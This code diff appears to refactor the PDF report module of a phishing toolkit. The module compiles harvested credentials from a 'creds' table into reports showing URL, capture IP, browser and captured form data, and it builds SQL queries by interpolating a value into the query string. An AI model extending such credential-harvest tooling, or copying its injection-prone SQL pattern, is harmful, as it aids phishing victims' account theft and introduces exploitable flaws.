@@ -13,16 +13,19 @@ def generate_report(DATABASE, cpm):
     conex = connect(DATABASE)
     cursor = conex.cursor()
     list_urls = []
-       
+
     for urls in cursor.execute('SELECT DISTINCT url FROM creds'): list_urls += urls
     _cURL = cpm
     choose_url = 'http' if _cURL == 'All' else _cURL
     result_query = []
-    for row in cursor.execute('SELECT * FROM creds WHERE url GLOB "*{}*"'.format(choose_url)):
+    for row in cursor.execute(f'SELECT * FROM creds WHERE url GLOB "*{choose_url}*"'):
         result_query += row
-        
-    result_count = cursor.execute('SELECT COUNT(*) FROM creds WHERE url GLOB "*{}*"'.format(choose_url)).fetchone()
-    
+
+    result_count = cursor.execute(
+        f'SELECT COUNT(*) FROM creds WHERE url GLOB "*{choose_url}*"'
+    ).fetchone()
+
+
     return result_query, result_count
 
 def generate_unique(DATABASE,cpm):
@@ -43,7 +46,7 @@ def generate_unique(DATABASE,cpm):
                                      'SOCIALFISH_transparent.png')
             logo_wrapper.append(StandAloneGraphic(image_options="width=120px",
                                 filename=logo_file))
-    
+
     with first_page.create(Head("R")) as header_right:
         with header_right.create(MiniPage(width=NoEscape(r'0.49\textwidth'),
                                           pos='c', align='r')) as wrapper_right:
@@ -63,7 +66,7 @@ def generate_unique(DATABASE,cpm):
 
     with doc.create(Tabu("X[l] X[r]")) as first_page_table:
         customer = MiniPage(width=NoEscape(r"0.49\textwidth"), pos='h')
-        
+
         branch = MiniPage(width=NoEscape(r"0.49\textwidth"), pos='t!',
                           align='r')
 
@@ -74,7 +77,7 @@ def generate_unique(DATABASE,cpm):
     doc.add_color(name="lightgray", model="gray", description="0.80")
 
     with doc.create(LongTabu("X[15l]",
-                             row_height=1.8)) as data_table:
+                                 row_height=1.8)) as data_table:
         data_table.add_row(["Organization\nCapture IP\nBrowser\nLog\n"],
                            mapper=bold,
                            color="lightgray")
@@ -89,13 +92,13 @@ def generate_unique(DATABASE,cpm):
             url = result_query[1+x].split('//')[1]
             ip = result_query[7+x]
             log_dict = literal_eval(result_query[2+x])
-            
+
             if 'skstamp' in log_dict.keys():
                 rm_trash = log_dict.pop('skstamp')
             elif 'utf8' in log_dict.keys():
                 rm_trash = log_dict.pop('utf8')
 
-            browser = result_query[4+x] + ' v' + result_query[5+x]
+            browser = f'{result_query[4+x]} v{result_query[5+x]}'
             x = 8*(i+1)
 
             row_tex = [url+'\n'+ip+'\n'+browser+'\n'+str(log_dict)+'\n']
@@ -106,6 +109,6 @@ def generate_unique(DATABASE,cpm):
                 data_table.add_row(row_tex)
 
     doc.append(NewPage())
-    pdf_name = 'Report{}'.format(strftime('-%y%m'))
+    pdf_name = f"Report{strftime('-%y%m')}"
     doc.generate_pdf(pdf_name, clean_tex=False)
-    open_new(os.getcwd()+'/'+pdf_name+'.pdf')
+    open_new(f'{os.getcwd()}/{pdf_name}.pdf')
